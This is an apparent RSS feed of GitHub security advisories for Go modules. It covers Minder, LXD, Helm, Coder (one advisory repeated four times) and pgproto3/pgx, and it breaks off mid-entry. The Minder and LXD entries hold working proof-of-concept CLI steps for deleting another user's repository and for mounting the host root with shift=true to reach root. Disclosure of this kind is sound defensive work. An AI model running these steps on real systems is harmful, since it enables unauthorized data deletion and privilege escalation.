<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://azu.github.io/github-advisory-database-rss/go.rss</id>
    <title>Security Advisory for Go modules</title>
    <updated>2024-03-06T11:01:25.582Z</updated>
    <generator>github-advisory-database-rss</generator>
    <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Ago"/>
    <subtitle>Security Advisory for Go modules on GitHub</subtitle>
    <rights>github-advisory-database-rss</rights>
    <category term="CRITICAL"/>
    <category term="HIGH"/>
    <category term="MODERATE"/>
    <category term="LOW"/>
    <entry>
        <title type="html"><![CDATA[[github.com/stacklok/minder] `GetRepositoryByName`, `DeleteRepositoryByName` and `GetArtifactByName` allow access of arbitrary repositories in Minder by any authenticated user]]></title>
        <id>https://github.com/advisories/GHSA-v627-69v2-xx37</id>
        <link href="https://github.com/advisories/GHSA-v627-69v2-xx37"/>
        <updated>2024-03-05T16:20:11.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>A Minder user can use the endpoints listed in the issue title to access any repository in the DB, irrespective of who owns the repo and any permissions that user may have.</p>
<h3 id="details">Details</h3>
<p><a href="https://github.com/stacklok/minder/blob/e88e4b286e4bc04c03b0332a77961f085e1aa77f/database/query/repositories.sql#L22-L23">https://github.com/stacklok/minder/blob/e88e4b286e4bc04c03b0332a77961f085e1aa77f/database/query/repositories.sql#L22-L23</a>
<a href="https://github.com/stacklok/minder/blob/a115c8524fbd582b2b277eaadce024bebbded508/internal/controlplane/handlers_repositories.go#L277-L278">https://github.com/stacklok/minder/blob/a115c8524fbd582b2b277eaadce024bebbded508/internal/controlplane/handlers_repositories.go#L277-L278</a></p>
<p>The DB query used here checks by repo owner, repo name and provider name (which is always "github"). These query values are not distinct for the particular user - as long as the user has valid credentials and a provider, they can set the repo owner/name to any value they want and the server will return information on this repo.</p>
<p><code>DeleteRepositoryByName</code> uses the same query and I have been able to delete another user's repo using this technique.</p>
<p>The <code>GetArtifactByName</code> endpoint also uses this DB query. I have not reproduced the behaviour with this endpoint due to a lack of a suitable test case, but I do not see anything in the implementation of the endpoint to prevent it being exploited.</p>
<h3 id="poc">PoC</h3>
<p>Setup:</p>
<ol>
<li>Fresh provider/project on the production minder instance which is owned by me.</li>
<li>A repo registered by another user (in this case, Ozz)</li>
</ol>
<pre><code># show my identity
$ minder auth whoami
No config file present, using default values.

 Here are your details:

+----------------------------------------------------+----------------------------------------------------+
|                        KEY                         |                       VALUE                        |
+----------------------------------------------------+----------------------------------------------------+
| Subject                                            | c93cc12e-999d-49f4-9ee3-593fdfb39204               |
+----------------------------------------------------+----------------------------------------------------+
| Created At                                         | 2024-02-26 15:53:29.228 +0000                      |
|                                                    | UTC                                                |
+----------------------------------------------------+----------------------------------------------------+
| Updated At                                         | 2024-02-26 15:53:29.228 +0000                      |
|                                                    | UTC                                                |
+----------------------------------------------------+----------------------------------------------------+
| Minder Server                                      | api.stacklok.com:443                               |
+----------------------------------------------------+----------------------------------------------------+
| Project                                            | dmjb /                                             |
|                                                    | ca059552-7b8a-4c6e-918d-ca7e6cbd0bab               |
+----------------------------------------------------+----------------------------------------------------+

# show that I have no repos registered
$ minder repo list
No config file present, using default values.
+----+---------+----------+-------------+-------+------+
| ID | PROJECT | PROVIDER | UPSTREAM ID | OWNER | NAME |
+----+---------+----------+-------------+-------+------+

# show details on one of Ozz's repos
$ minder repo get -n JAORMX/auditevent
No config file present, using default values.
{
  "id":  "a7e82080-9b6c-41f3-bc08-8e9442f8b2d2",
  "context":  {
    "provider":  "github",
    "project":  "b513f7f0-26dc-42e6-81a0-577df5489e62"
  },
  "owner":  "JAORMX",
  "name":  "auditevent",
  "repoId":  "605597568",
  "hookUrl":  "https://api.github.com/repos/JAORMX/auditevent/hooks/464564107",
  "deployUrl":  "https://api.github.com/repos/JAORMX/auditevent/deployments",
  "cloneUrl":  "https://github.com/JAORMX/auditevent.git",
  "isFork":  true,
  "createdAt":  "2024-03-04T13:27:54.019356Z",
  "updatedAt":  "2024-03-04T13:27:54.019356Z",
  "defaultBranch":  "main"
}

# delete Ozz's repo
$ minder repo delete -n JAORMX/auditevent
No config file present, using default values.
Successfully deleted repo with name: JAORMX/auditevent

# Ozz's repo no longer exists
$ minder repo get -n JAORMX/auditevent
No config file present, using default values.
Message: Error getting repo by name
Details: NotFound means some requested entity (e.g., file or directory) was
not found.
</code></pre>
<h3 id="impact">Impact</h3>
<p>Any user and project in a multi-tenant Minder instance.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/stacklok/minder/security/advisories/GHSA-v627-69v2-xx37">https://github.com/stacklok/minder/security/advisories/GHSA-v627-69v2-xx37</a></li>
<li><a href="https://github.com/stacklok/minder/commit/45750b4e9fb2de33365758366e06c19e999bd2eb">https://github.com/stacklok/minder/commit/45750b4e9fb2de33365758366e06c19e999bd2eb</a></li>
<li><a href="https://github.com/advisories/GHSA-v627-69v2-xx37">https://github.com/advisories/GHSA-v627-69v2-xx37</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-v627-69v2-xx37</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-03-05T16:20:07.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/canonical/lxd] Canonical LXD documentation improvement to make clear restricted.devices.disk=allow without restricted.devices.disk.paths also allows shift=true]]></title>
        <id>https://github.com/advisories/GHSA-x9qq-236j-gj97</id>
        <link href="https://github.com/advisories/GHSA-x9qq-236j-gj97"/>
        <updated>2024-03-05T15:26:24.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>If a user has restricted access to a project that is configured with <code>restricted=true</code>, they can gain root access on the system by creating a disk device with <code>shift=true</code> and creating a setuid root executable. This is possible because the <code>shift</code> property is not restricted unless <code>restricted.devices.disk.paths</code> is set.</p>
<h3 id="details">Details</h3>
<p>The following patch shows the offending code with a possible fix:</p>
<pre><code class="language-patch">--- a/lxd/device/disk.go
+++ b/lxd/device/disk.go
@@ -429,17 +429,19 @@ func (d *disk) validateEnvironmentSourcePath() error {
        if instProject.Name != api.ProjectDefaultName {
                // If restricted disk paths are in force, then check the disk's source is allowed, and record the
                // allowed parent path for later user during device start up sequence.
-               if shared.IsTrue(instProject.Config["restricted"]) &amp;&amp; instProject.Config["restricted.devices.disk.paths"] != "" {
-                       allowed, restrictedParentSourcePath := project.CheckRestrictedDevicesDiskPaths(instProject.Config, d.config["source"])
-                       if !allowed {
-                               return fmt.Errorf("Disk source path %q not allowed by project for disk %q", d.config["source"], d.name)
+               if shared.IsTrue(instProject.Config["restricted"]) {
+                       if instProject.Config["restricted.devices.disk.paths"] != "" {
+                               allowed, restrictedParentSourcePath := project.CheckRestrictedDevicesDiskPaths(instProject.Config, d.config["source"])
+                               if !allowed {
+                                       return fmt.Errorf("Disk source path %q not allowed by project for disk %q", d.config["source"], d.name)
+                               }
+
+                               d.restrictedParentSourcePath = shared.HostPath(restrictedParentSourcePath)
                        }

                        if shared.IsTrue(d.config["shift"]) {
                                return fmt.Errorf(`The "shift" property cannot be used with a restricted source path`)
                        }
-
-                       d.restrictedParentSourcePath = shared.HostPath(restrictedParentSourcePath)
                }
        }
</code></pre>
<h3 id="poc">PoC</h3>
<pre><code class="language-bash">$ lxc project create restricted -c restricted=true -c restricted.devices.disk=allow
$ lxc project switch restricted
$ lxc profile device add default root disk path=/ pool=default
$ lxc init ubuntu:22.04 c1
$ lxc config device add c1 d1 disk source=/ path=/mnt shift=true
$ lxc start c1  # no error

$ lxc project set restricted restricted.devices.disk.paths=/  # explicitly allow mounting /
$ lxc restart c1
Error: Failed to start device "d1": The "shift" property cannot be used with a restricted source path
</code></pre>
<p>Created <a href="https://github.com/canonical/lxd/issues/12606">https://github.com/canonical/lxd/issues/12606</a> to improve the documentation as per <a href="https://github.com/canonical/lxd/security/advisories/GHSA-x9qq-236j-gj97#advisory-comment-91918">https://github.com/canonical/lxd/security/advisories/GHSA-x9qq-236j-gj97#advisory-comment-91918</a></p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/canonical/lxd/security/advisories/GHSA-x9qq-236j-gj97">https://github.com/canonical/lxd/security/advisories/GHSA-x9qq-236j-gj97</a></li>
<li><a href="https://github.com/canonical/lxd/issues/12606">https://github.com/canonical/lxd/issues/12606</a></li>
<li><a href="https://github.com/canonical/lxd/commit/ce1bd0dd37bb3810fe6f16c237a4b65257f231f1">https://github.com/canonical/lxd/commit/ce1bd0dd37bb3810fe6f16c237a4b65257f231f1</a></li>
<li><a href="https://github.com/advisories/GHSA-x9qq-236j-gj97">https://github.com/advisories/GHSA-x9qq-236j-gj97</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-x9qq-236j-gj97</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2023-12-05T23:32:58.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[helm.sh/helm/v3] Helm shows secrets in clear text]]></title>
        <id>https://github.com/advisories/GHSA-jw44-4f3j-q396</id>
        <link href="https://github.com/advisories/GHSA-jw44-4f3j-q396"/>
        <updated>2024-03-05T14:39:01.000Z</updated>
        <content type="html"><![CDATA[<p>An issue was discovered in Cloud Native Computing Foundation (CNCF) Helm. It displays values of secrets when the --dry-run flag is used. This is a security concern in some use cases, such as a --dry-run call by a CI/CD tool. NOTE: the vendor's position is that this behavior was introduced intentionally, and cannot be removed without breaking backwards compatibility (some users may be relying on these values).</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2019-25210">https://nvd.nist.gov/vuln/detail/CVE-2019-25210</a></li>
<li><a href="https://github.com/helm/helm/issues/7275">https://github.com/helm/helm/issues/7275</a></li>
<li><a href="https://www.cncf.io/projects/helm">https://www.cncf.io/projects/helm</a></li>
<li><a href="https://github.com/advisories/GHSA-jw44-4f3j-q396">https://github.com/advisories/GHSA-jw44-4f3j-q396</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-jw44-4f3j-q396</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-03-03T21:31:25.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/coder/coder] Coder's OIDC authentication allows email with partially matching domain to register]]></title>
        <id>https://github.com/advisories/GHSA-7cc2-r658-7xpf</id>
        <link href="https://github.com/advisories/GHSA-7cc2-r658-7xpf"/>
        <updated>2024-03-04T21:28:54.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>A vulnerability in Coder's OIDC authentication could allow an attacker to bypass the <code>CODER_OIDC_EMAIL_DOMAIN</code> verification and create an account with an email not in the allowlist. Deployments are only affected if the OIDC provider allows users to create accounts on the provider (such as public providers like <code>google.com</code>).</p>
<h3 id="details">Details</h3>
<p>During OIDC registration, the user's email was improperly validated against the allowed <code>CODER_OIDC_EMAIL_DOMAIN</code>s. This could allow a user with a domain that only partially matched an allowed domain to successfully login or register (e.g. <code>user@exploitcorp.com</code> would match the allowed domain <code>corp.com</code>).</p>
<p>An attacker could register a domain name that exploited this vulnerability and register on a Coder instance with a public OIDC provider.</p>
<h3 id="impact">Impact</h3>
<p>Coder instances with OIDC enabled and protected by the <code>CODER_OIDC_EMAIL_DOMAIN</code> configuration.</p>
<p>Coder instances using a private OIDC provider are not affected, as arbitrary users cannot register through a private OIDC provider without first having an account on the provider.</p>
<p>Public OIDC providers (such as <code>google.com</code> without permitted domains set on the OAuth2 App) are impacted.</p>
<p>GitHub authentication and external authentication are not impacted.</p>
<h3 id="was-my-deployment-impacted">Was my deployment impacted?</h3>
<p>To check if your deployment was exploited:</p>
<ul>
<li>View the audit log on your deployment for unexpected registered users (using the <code>action:register</code> filter)</li>
<li>Check the users list for unexpected users<ul>
<li>Users created via this exploit will have a domain that ends with one of the allowed domains but doesn’t fully match (e.g. <code>@exploitcorp.com</code> instead of <code>@corp.com</code>)</li>
</ul>
</li>
</ul>
<h3 id="patched-versions">Patched Versions</h3>
<p>This vulnerability is remedied in</p>
<ul>
<li>v2.8.4</li>
<li>v2.7.3</li>
<li>v2.6.1</li>
</ul>
<p>All versions prior to these patches are affected by the vulnerability. <strong>It is recommended that customers upgrade their deployments as soon as possible if they are utilizing OIDC authentication with the <code>CODER_OIDC_EMAIL_DOMAIN</code> setting.</strong></p>
<h3 id="thanks">Thanks</h3>
<ul>
<li><a href="https://github.com/arcz">https://github.com/arcz</a></li>
<li><a href="https://www.trailofbits.com">https://www.trailofbits.com</a></li>
</ul>
<h3 id="references">References</h3>
<p><a href="https://github.com/coder/coder/security/advisories/GHSA-7cc2-r658-7xpf">https://github.com/coder/coder/security/advisories/GHSA-7cc2-r658-7xpf</a>
<a href="https://github.com/coder/coder/commit/4439a920e454a82565e445e4376c669e3b89591c">https://github.com/coder/coder/commit/4439a920e454a82565e445e4376c669e3b89591c</a>
<a href="https://nvd.nist.gov/vuln/detail/CVE-2024-27918">https://nvd.nist.gov/vuln/detail/CVE-2024-27918</a></p>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/coder/coder/security/advisories/GHSA-7cc2-r658-7xpf">https://github.com/coder/coder/security/advisories/GHSA-7cc2-r658-7xpf</a></li>
<li><a href="https://github.com/coder/coder/commit/1171ce7add017481d28441575024209ac160ecb0">https://github.com/coder/coder/commit/1171ce7add017481d28441575024209ac160ecb0</a></li>
<li><a href="https://github.com/coder/coder/commit/2ba84911f8b02605e5958d5e4a2fe3979ec50b31">https://github.com/coder/coder/commit/2ba84911f8b02605e5958d5e4a2fe3979ec50b31</a></li>
<li><a href="https://github.com/coder/coder/commit/2d37eb42e7db656e343fe1f36de5ab1a1a62f4fb">https://github.com/coder/coder/commit/2d37eb42e7db656e343fe1f36de5ab1a1a62f4fb</a></li>
<li><a href="https://github.com/coder/coder/commit/4439a920e454a82565e445e4376c669e3b89591c">https://github.com/coder/coder/commit/4439a920e454a82565e445e4376c669e3b89591c</a></li>
<li><a href="https://github.com/advisories/GHSA-7cc2-r658-7xpf">https://github.com/advisories/GHSA-7cc2-r658-7xpf</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-7cc2-r658-7xpf</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-03-04T20:45:36.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/coder/coder/v2] Coder's OIDC authentication allows email with partially matching domain to register]]></title>
        <id>https://github.com/advisories/GHSA-7cc2-r658-7xpf</id>
        <link href="https://github.com/advisories/GHSA-7cc2-r658-7xpf"/>
        <updated>2024-03-04T21:28:54.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>A vulnerability in Coder's OIDC authentication could allow an attacker to bypass the <code>CODER_OIDC_EMAIL_DOMAIN</code> verification and create an account with an email not in the allowlist. Deployments are only affected if the OIDC provider allows users to create accounts on the provider (such as public providers like <code>google.com</code>).</p>
<h3 id="details">Details</h3>
<p>During OIDC registration, the user's email was improperly validated against the allowed <code>CODER_OIDC_EMAIL_DOMAIN</code>s. This could allow a user with a domain that only partially matched an allowed domain to successfully login or register (e.g. <code>user@exploitcorp.com</code> would match the allowed domain <code>corp.com</code>).</p>
<p>An attacker could register a domain name that exploited this vulnerability and register on a Coder instance with a public OIDC provider.</p>
<h3 id="impact">Impact</h3>
<p>Coder instances with OIDC enabled and protected by the <code>CODER_OIDC_EMAIL_DOMAIN</code> configuration.</p>
<p>Coder instances using a private OIDC provider are not affected, as arbitrary users cannot register through a private OIDC provider without first having an account on the provider.</p>
<p>Public OIDC providers (such as <code>google.com</code> without permitted domains set on the OAuth2 App) are impacted.</p>
<p>GitHub authentication and external authentication are not impacted.</p>
<h3 id="was-my-deployment-impacted">Was my deployment impacted?</h3>
<p>To check if your deployment was exploited:</p>
<ul>
<li>View the audit log on your deployment for unexpected registered users (using the <code>action:register</code> filter)</li>
<li>Check the users list for unexpected users<ul>
<li>Users created via this exploit will have a domain that ends with one of the allowed domains but doesn’t fully match (e.g. <code>@exploitcorp.com</code> instead of <code>@corp.com</code>)</li>
</ul>
</li>
</ul>
<h3 id="patched-versions">Patched Versions</h3>
<p>This vulnerability is remedied in</p>
<ul>
<li>v2.8.4</li>
<li>v2.7.3</li>
<li>v2.6.1</li>
</ul>
<p>All versions prior to these patches are affected by the vulnerability. <strong>It is recommended that customers upgrade their deployments as soon as possible if they are utilizing OIDC authentication with the <code>CODER_OIDC_EMAIL_DOMAIN</code> setting.</strong></p>
<h3 id="thanks">Thanks</h3>
<ul>
<li><a href="https://github.com/arcz">https://github.com/arcz</a></li>
<li><a href="https://www.trailofbits.com">https://www.trailofbits.com</a></li>
</ul>
<h3 id="references">References</h3>
<p><a href="https://github.com/coder/coder/security/advisories/GHSA-7cc2-r658-7xpf">https://github.com/coder/coder/security/advisories/GHSA-7cc2-r658-7xpf</a>
<a href="https://github.com/coder/coder/commit/4439a920e454a82565e445e4376c669e3b89591c">https://github.com/coder/coder/commit/4439a920e454a82565e445e4376c669e3b89591c</a>
<a href="https://nvd.nist.gov/vuln/detail/CVE-2024-27918">https://nvd.nist.gov/vuln/detail/CVE-2024-27918</a></p>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/coder/coder/security/advisories/GHSA-7cc2-r658-7xpf">https://github.com/coder/coder/security/advisories/GHSA-7cc2-r658-7xpf</a></li>
<li><a href="https://github.com/coder/coder/commit/1171ce7add017481d28441575024209ac160ecb0">https://github.com/coder/coder/commit/1171ce7add017481d28441575024209ac160ecb0</a></li>
<li><a href="https://github.com/coder/coder/commit/2ba84911f8b02605e5958d5e4a2fe3979ec50b31">https://github.com/coder/coder/commit/2ba84911f8b02605e5958d5e4a2fe3979ec50b31</a></li>
<li><a href="https://github.com/coder/coder/commit/2d37eb42e7db656e343fe1f36de5ab1a1a62f4fb">https://github.com/coder/coder/commit/2d37eb42e7db656e343fe1f36de5ab1a1a62f4fb</a></li>
<li><a href="https://github.com/coder/coder/commit/4439a920e454a82565e445e4376c669e3b89591c">https://github.com/coder/coder/commit/4439a920e454a82565e445e4376c669e3b89591c</a></li>
<li><a href="https://github.com/advisories/GHSA-7cc2-r658-7xpf">https://github.com/advisories/GHSA-7cc2-r658-7xpf</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-7cc2-r658-7xpf</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-03-04T20:45:36.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/coder/coder/v2] Coder's OIDC authentication allows email with partially matching domain to register]]></title>
        <id>https://github.com/advisories/GHSA-7cc2-r658-7xpf</id>
        <link href="https://github.com/advisories/GHSA-7cc2-r658-7xpf"/>
        <updated>2024-03-04T21:28:54.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>A vulnerability in Coder's OIDC authentication could allow an attacker to bypass the <code>CODER_OIDC_EMAIL_DOMAIN</code> verification and create an account with an email not in the allowlist. Deployments are only affected if the OIDC provider allows users to create accounts on the provider (such as public providers like <code>google.com</code>).</p>
<h3 id="details">Details</h3>
<p>During OIDC registration, the user's email was improperly validated against the allowed <code>CODER_OIDC_EMAIL_DOMAIN</code>s. This could allow a user with a domain that only partially matched an allowed domain to successfully login or register (e.g. <code>user@exploitcorp.com</code> would match the allowed domain <code>corp.com</code>).</p>
<p>An attacker could register a domain name that exploited this vulnerability and register on a Coder instance with a public OIDC provider.</p>
<h3 id="impact">Impact</h3>
<p>Coder instances with OIDC enabled and protected by the <code>CODER_OIDC_EMAIL_DOMAIN</code> configuration.</p>
<p>Coder instances using a private OIDC provider are not affected, as arbitrary users cannot register through a private OIDC provider without first having an account on the provider.</p>
<p>Public OIDC providers (such as <code>google.com</code> without permitted domains set on the OAuth2 App) are impacted.</p>
<p>GitHub authentication and external authentication are not impacted.</p>
<h3 id="was-my-deployment-impacted">Was my deployment impacted?</h3>
<p>To check if your deployment was exploited:</p>
<ul>
<li>View the audit log on your deployment for unexpected registered users (using the <code>action:register</code> filter)</li>
<li>Check the users list for unexpected users<ul>
<li>Users created via this exploit will have a domain that ends with one of the allowed domains but doesn’t fully match (e.g. <code>@exploitcorp.com</code> instead of <code>@corp.com</code>)</li>
</ul>
</li>
</ul>
<h3 id="patched-versions">Patched Versions</h3>
<p>This vulnerability is remedied in</p>
<ul>
<li>v2.8.4</li>
<li>v2.7.3</li>
<li>v2.6.1</li>
</ul>
<p>All versions prior to these patches are affected by the vulnerability. <strong>It is recommended that customers upgrade their deployments as soon as possible if they are utilizing OIDC authentication with the <code>CODER_OIDC_EMAIL_DOMAIN</code> setting.</strong></p>
<h3 id="thanks">Thanks</h3>
<ul>
<li><a href="https://github.com/arcz">https://github.com/arcz</a></li>
<li><a href="https://www.trailofbits.com">https://www.trailofbits.com</a></li>
</ul>
<h3 id="references">References</h3>
<p><a href="https://github.com/coder/coder/security/advisories/GHSA-7cc2-r658-7xpf">https://github.com/coder/coder/security/advisories/GHSA-7cc2-r658-7xpf</a>
<a href="https://github.com/coder/coder/commit/4439a920e454a82565e445e4376c669e3b89591c">https://github.com/coder/coder/commit/4439a920e454a82565e445e4376c669e3b89591c</a>
<a href="https://nvd.nist.gov/vuln/detail/CVE-2024-27918">https://nvd.nist.gov/vuln/detail/CVE-2024-27918</a></p>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/coder/coder/security/advisories/GHSA-7cc2-r658-7xpf">https://github.com/coder/coder/security/advisories/GHSA-7cc2-r658-7xpf</a></li>
<li><a href="https://github.com/coder/coder/commit/1171ce7add017481d28441575024209ac160ecb0">https://github.com/coder/coder/commit/1171ce7add017481d28441575024209ac160ecb0</a></li>
<li><a href="https://github.com/coder/coder/commit/2ba84911f8b02605e5958d5e4a2fe3979ec50b31">https://github.com/coder/coder/commit/2ba84911f8b02605e5958d5e4a2fe3979ec50b31</a></li>
<li><a href="https://github.com/coder/coder/commit/2d37eb42e7db656e343fe1f36de5ab1a1a62f4fb">https://github.com/coder/coder/commit/2d37eb42e7db656e343fe1f36de5ab1a1a62f4fb</a></li>
<li><a href="https://github.com/coder/coder/commit/4439a920e454a82565e445e4376c669e3b89591c">https://github.com/coder/coder/commit/4439a920e454a82565e445e4376c669e3b89591c</a></li>
<li><a href="https://github.com/advisories/GHSA-7cc2-r658-7xpf">https://github.com/advisories/GHSA-7cc2-r658-7xpf</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-7cc2-r658-7xpf</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-03-04T20:45:36.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/coder/coder/v2] Coder's OIDC authentication allows email with partially matching domain to register]]></title>
        <id>https://github.com/advisories/GHSA-7cc2-r658-7xpf</id>
        <link href="https://github.com/advisories/GHSA-7cc2-r658-7xpf"/>
        <updated>2024-03-04T21:28:54.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>A vulnerability in Coder's OIDC authentication could allow an attacker to bypass the <code>CODER_OIDC_EMAIL_DOMAIN</code> verification and create an account with an email not in the allowlist. Deployments are only affected if the OIDC provider allows users to create accounts on the provider (such as public providers like <code>google.com</code>).</p>
<h3 id="details">Details</h3>
<p>During OIDC registration, the user's email was improperly validated against the allowed <code>CODER_OIDC_EMAIL_DOMAIN</code>s. This could allow a user with a domain that only partially matched an allowed domain to successfully login or register (e.g. <code>user@exploitcorp.com</code> would match the allowed domain <code>corp.com</code>).</p>
<p>An attacker could register a domain name that exploited this vulnerability and register on a Coder instance with a public OIDC provider.</p>
<h3 id="impact">Impact</h3>
<p>Coder instances with OIDC enabled and protected by the <code>CODER_OIDC_EMAIL_DOMAIN</code> configuration.</p>
<p>Coder instances using a private OIDC provider are not affected, as arbitrary users cannot register through a private OIDC provider without first having an account on the provider.</p>
<p>Public OIDC providers (such as <code>google.com</code> without permitted domains set on the OAuth2 App) are impacted.</p>
<p>GitHub authentication and external authentication are not impacted.</p>
<h3 id="was-my-deployment-impacted">Was my deployment impacted?</h3>
<p>To check if your deployment was exploited:</p>
<ul>
<li>View the audit log on your deployment for unexpected registered users (using the <code>action:register</code> filter)</li>
<li>Check the users list for unexpected users<ul>
<li>Users created via this exploit will have a domain that ends with one of the allowed domains but doesn’t fully match (e.g. <code>@exploitcorp.com</code> instead of <code>@corp.com</code>)</li>
</ul>
</li>
</ul>
<h3 id="patched-versions">Patched Versions</h3>
<p>This vulnerability is remedied in</p>
<ul>
<li>v2.8.4</li>
<li>v2.7.3</li>
<li>v2.6.1</li>
</ul>
<p>All versions prior to these patches are affected by the vulnerability. <strong>It is recommended that customers upgrade their deployments as soon as possible if they are utilizing OIDC authentication with the <code>CODER_OIDC_EMAIL_DOMAIN</code> setting.</strong></p>
<h3 id="thanks">Thanks</h3>
<ul>
<li><a href="https://github.com/arcz">https://github.com/arcz</a></li>
<li><a href="https://www.trailofbits.com">https://www.trailofbits.com</a></li>
</ul>
<h3 id="references">References</h3>
<p><a href="https://github.com/coder/coder/security/advisories/GHSA-7cc2-r658-7xpf">https://github.com/coder/coder/security/advisories/GHSA-7cc2-r658-7xpf</a>
<a href="https://github.com/coder/coder/commit/4439a920e454a82565e445e4376c669e3b89591c">https://github.com/coder/coder/commit/4439a920e454a82565e445e4376c669e3b89591c</a>
<a href="https://nvd.nist.gov/vuln/detail/CVE-2024-27918">https://nvd.nist.gov/vuln/detail/CVE-2024-27918</a></p>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/coder/coder/security/advisories/GHSA-7cc2-r658-7xpf">https://github.com/coder/coder/security/advisories/GHSA-7cc2-r658-7xpf</a></li>
<li><a href="https://github.com/coder/coder/commit/1171ce7add017481d28441575024209ac160ecb0">https://github.com/coder/coder/commit/1171ce7add017481d28441575024209ac160ecb0</a></li>
<li><a href="https://github.com/coder/coder/commit/2ba84911f8b02605e5958d5e4a2fe3979ec50b31">https://github.com/coder/coder/commit/2ba84911f8b02605e5958d5e4a2fe3979ec50b31</a></li>
<li><a href="https://github.com/coder/coder/commit/2d37eb42e7db656e343fe1f36de5ab1a1a62f4fb">https://github.com/coder/coder/commit/2d37eb42e7db656e343fe1f36de5ab1a1a62f4fb</a></li>
<li><a href="https://github.com/coder/coder/commit/4439a920e454a82565e445e4376c669e3b89591c">https://github.com/coder/coder/commit/4439a920e454a82565e445e4376c669e3b89591c</a></li>
<li><a href="https://github.com/advisories/GHSA-7cc2-r658-7xpf">https://github.com/advisories/GHSA-7cc2-r658-7xpf</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-7cc2-r658-7xpf</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-03-04T20:45:36.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/jackc/pgproto3] pgproto3 SQL Injection via Protocol Message Size Overflow]]></title>
        <id>https://github.com/advisories/GHSA-7jwh-3vrq-q3m8</id>
        <link href="https://github.com/advisories/GHSA-7jwh-3vrq-q3m8"/>
        <updated>2024-03-04T20:45:26.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>SQL injection can occur if an attacker can cause a single query or bind message to exceed 4 GB in size. An integer overflow in the calculated message size can cause the one large message to be sent as multiple messages under the attacker's control.</p>
<h3 id="patches">Patches</h3>
<p>The problem is resolved in v2.3.3</p>
<h3 id="workarounds">Workarounds</h3>
<p>Reject user input large enough to cause a single query or bind message to exceed 4 GB in size.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/jackc/pgproto3/security/advisories/GHSA-7jwh-3vrq-q3m8">https://github.com/jackc/pgproto3/security/advisories/GHSA-7jwh-3vrq-q3m8</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-27304">https://nvd.nist.gov/vuln/detail/CVE-2024-27304</a></li>
<li><a href="https://github.com/jackc/pgproto3/commit/945c2126f6db8f3bea7eeebe307c01fe92bca007">https://github.com/jackc/pgproto3/commit/945c2126f6db8f3bea7eeebe307c01fe92bca007</a></li>
<li><a href="https://github.com/advisories/GHSA-7jwh-3vrq-q3m8">https://github.com/advisories/GHSA-7jwh-3vrq-q3m8</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-7jwh-3vrq-q3m8</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-03-04T20:45:25.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/jackc/pgproto3] pgx SQL Injection via Protocol Message Size Overflow]]></title>
        <id>https://github.com/advisories/GHSA-mrww-27vc-gghv</id>
        <link href="https://github.com/advisories/GHSA-mrww-27vc-gghv"/>
        <updated>2024-03-04T20:43:50.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>SQL injection can occur if an attacker can cause a single query or bind message to exceed 4 GB in size. An integer overflow in the calculated message size can cause the one large message to be sent as multiple messages under the attacker's control.</p>
<h3 id="patches">Patches</h3>
<p>The problem is resolved in v4.18.2 and v5.5.4.</p>
<h3 id="workarounds">Workarounds</h3>
